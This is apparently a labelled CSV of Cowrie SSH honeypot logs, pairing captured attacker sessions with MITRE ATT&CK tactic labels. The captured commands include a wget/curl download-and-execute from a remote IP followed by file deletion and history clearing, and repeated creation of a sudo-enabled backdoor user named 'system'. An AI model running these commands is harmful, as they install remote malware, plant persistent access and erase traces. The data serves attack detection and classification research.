,event,session_id,session,labels
681,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T08:56:11.645394Z"", ""session_id"": ""abeb172218b9""}",abeb172218b9,#!/bin/sh ; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; wget http://43.249.172.195:888/112 ; curl -O http://43.249.172.195:888/112 ; wget http://43.249.172.195:888/8001 ; curl -O http://43.249.172.195:888/8001 ; chmod +x 8001 ; ./8001 ; chmod +x 112 ; ./112 ; rm -rf 112 ; rm -rf 8001 ; rm -rf 112.sh ; history -c;,"['Execution', 'Defense Evasion', 'Initial Access', 'Privilege Escalation', 'Persistence']"
682,"{""eventid"": ""cowrie.command.input"", ""input"": ""#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; wget http://43.249.172.195:888/8001; curl -O http://43.249.172.195:888/8001; chmod +x 8001; ./8001; chmod +x 112; ./112; rm -rf 112; rm -rf 8001; rm -rf 112.sh; history -c"", ""message"": ""CMD: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; wget http://43.249.172.195:888/8001; curl -O http://43.249.172.195:888/8001; chmod +x 8001; ./8001; chmod +x 112; ./112; rm -rf 112; rm -rf 8001; rm -rf 112.sh; history -c"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T08:56:11.646025Z"", ""session_id"": ""abeb172218b9""}",abeb172218b9,#!/bin/sh ; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; wget http://43.249.172.195:888/112 ; curl -O http://43.249.172.195:888/112 ; wget http://43.249.172.195:888/8001 ; curl -O http://43.249.172.195:888/8001 ; chmod +x 8001 ; ./8001 ; chmod +x 112 ; ./112 ; rm -rf 112 ; rm -rf 8001 ; rm -rf 112.sh ; history -c;,"['Execution', 'Defense Evasion', 'Initial Access', 'Privilege Escalation', 'Persistence']"
683,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""eyshcjdmzg"", ""message"": ""SFTP Uploaded file \""eyshcjdmzg\"" to var/lib/cowrie/downloads/87e0a05bc63eae251277053c7891e4d51ab3a257587b750076183c76a9472357"", ""outfile"": ""var/lib/cowrie/downloads/87e0a05bc63eae251277053c7891e4d51ab3a257587b750076183c76a9472357"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""87e0a05bc63eae251277053c7891e4d51ab3a257587b750076183c76a9472357"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T08:58:38.445937Z"", ""session_id"": ""abeb172218b9""}",abeb172218b9,#!/bin/sh ; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; wget http://43.249.172.195:888/112 ; curl -O http://43.249.172.195:888/112 ; wget http://43.249.172.195:888/8001 ; curl -O http://43.249.172.195:888/8001 ; chmod +x 8001 ; ./8001 ; chmod +x 112 ; ./112 ; rm -rf 112 ; rm -rf 8001 ; rm -rf 112.sh ; history -c;,"['Execution', 'Defense Evasion', 'Initial Access', 'Privilege Escalation', 'Persistence']"
684,"{""duration"": ""148.7"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 148.7 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T08:58:38.447648Z"", ""session_id"": ""abeb172218b9""}",abeb172218b9,#!/bin/sh ; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ; wget http://43.249.172.195:888/112 ; curl -O http://43.249.172.195:888/112 ; wget http://43.249.172.195:888/8001 ; curl -O http://43.249.172.195:888/8001 ; chmod +x 8001 ; ./8001 ; chmod +x 112 ; ./112 ; rm -rf 112 ; rm -rf 8001 ; rm -rf 112.sh ; history -c;,"['Execution', 'Defense Evasion', 'Initial Access', 'Privilege Escalation', 'Persistence']"
685,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:45501 (10.42.4.33:2222) [session: 93e4985bea48]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 45501.0, ""timestamp"": ""2025-08-08T08:19:44.613100Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
686,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:44.613506Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
687,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:44.821870Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
688,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.263309Z"", ""username"": ""root"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
689,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.490932Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
690,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.491290Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
691,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 UfRgbKtx"", ""message"": ""CMD: openssl passwd -1 UfRgbKtx"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.491800Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
692,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 UfRgbKtx"", ""message"": ""Command not found: openssl passwd -1 UfRgbKtx"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.493196Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
693,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/a85afc906e6dd1eebc323cba3b3d0164356b78a3b1702c4fd5f3fe78e590bd89 after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""a85afc906e6dd1eebc323cba3b3d0164356b78a3b1702c4fd5f3fe78e590bd89"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.597646Z"", ""ttylog"": ""var/lib/cowrie/tty/a85afc906e6dd1eebc323cba3b3d0164356b78a3b1702c4fd5f3fe78e590bd89"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
694,"{""duration"": ""1.0"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 1.0 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-08T08:19:45.598198Z"", ""session_id"": ""93e4985bea48""}",93e4985bea48,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 UfRgbKtx) system  && sudo usermod -aG sudo system ; openssl passwd -1 UfRgbKtx;,"['Discovery', 'Impact', 'Initial Access', 'Privilege Escalation', 'Execution']"
695,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:36201 (10.42.6.15:2222) [session: 6d242ab139b6]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 36201.0, ""timestamp"": ""2025-08-09T16:53:16.347889Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
696,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.349336Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
697,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.361988Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
698,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.404249Z"", ""username"": ""root"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
699,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.831896Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
700,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.832555Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
701,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 meam3s2Q"", ""message"": ""CMD: openssl passwd -1 meam3s2Q"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.833246Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
702,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 meam3s2Q"", ""message"": ""Command not found: openssl passwd -1 meam3s2Q"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.834024Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
703,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/444ed7bc90a483b2844cd7ec256ac2ad409c7c5a57422c49e30c8c5d3e0721cc after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""444ed7bc90a483b2844cd7ec256ac2ad409c7c5a57422c49e30c8c5d3e0721cc"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.847130Z"", ""ttylog"": ""var/lib/cowrie/tty/444ed7bc90a483b2844cd7ec256ac2ad409c7c5a57422c49e30c8c5d3e0721cc"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
704,"{""duration"": ""0.5"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.5 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-09T16:53:16.848070Z"", ""session_id"": ""6d242ab139b6""}",6d242ab139b6,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 meam3s2Q) system  && sudo usermod -aG sudo system ; openssl passwd -1 meam3s2Q;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
705,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:55893 (10.42.6.15:2222) [session: e795c2598e31]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 55893.0, ""timestamp"": ""2025-08-07T19:46:39.663102Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
706,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.664381Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
707,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.677201Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
708,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.719167Z"", ""username"": ""root"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
709,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.909865Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
710,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-07T19:46:39.910524Z"", ""session_id"": ""e795c2598e31""}",e795c2598e31,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 FnPmPUHM) system  && sudo usermod -aG sudo system ; openssl passwd -1 FnPmPUHM;,"['Discovery', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
